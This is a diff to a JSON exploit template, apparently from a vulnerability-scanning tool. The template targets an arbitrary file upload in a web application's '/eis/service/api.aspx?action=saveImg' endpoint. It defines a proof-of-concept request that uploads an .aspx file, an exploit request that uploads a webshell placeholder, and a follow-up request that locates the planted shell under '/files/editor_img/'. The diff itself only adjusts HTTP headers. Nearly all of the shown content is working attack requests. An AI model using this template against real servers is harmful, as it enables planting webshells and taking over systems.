@@ -7,10 +7,8 @@
 		"pocGet":"/eis/service/api.aspx?action=saveImg",
 		"pocPost":"------WebKitFormBoundaryxdgaqmqu\r\nContent-Disposition: form-data; name=\"file\";filename=\"24k.aspx\"\r\nContent-Type: text/html\r\n\r\n123\r\n------WebKitFormBoundaryxdgaqmqu--",
 		"header":{
-			"Accept":" text/html,application/xhtml+xml,application/xml",
+			"Accept":"*/*",
 			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-			"Connection":" close",
-			"Accept-Encoding":" gzip, deflate",
 			"Content-Length":" 172",
 			"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu"
 		},
@@ -21,10 +19,8 @@
 			"expGet":"/eis/service/api.aspx?action=saveImg",
 			"expPost":"------WebKitFormBoundaryxdgaqmqu\r\nContent-Disposition: form-data; name=\"file\";filename=\"24k.aspx\"\r\nContent-Type: text/html\r\n\r\n{webshell}\r\n------WebKitFormBoundaryxdgaqmqu--",
 			"header":{
-				"Accept":" text/html,application/xhtml+xml,application/xml",
+				"Accept":"*/*",
 				"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-				"Connection":" close",
-				"Accept-Encoding":" gzip, deflate",
 				"Content-Length":" 172",
 				"Content-Type":" multipart/form-data; boundary=----WebKitFormBoundaryxdgaqmqu"
 			},
@@ -34,9 +30,7 @@
 			"expGet":"/files/editor_img/{shellPath}",
 			"header":{
 				"User-Agent":" Mozilla/5.0",
-				"Connection":" close",
 				"content-type":" application/json",
-				"Accept-Encoding":" */*",
 				"Content-Length":" 29"
 			},
 			"Pattern":"()"
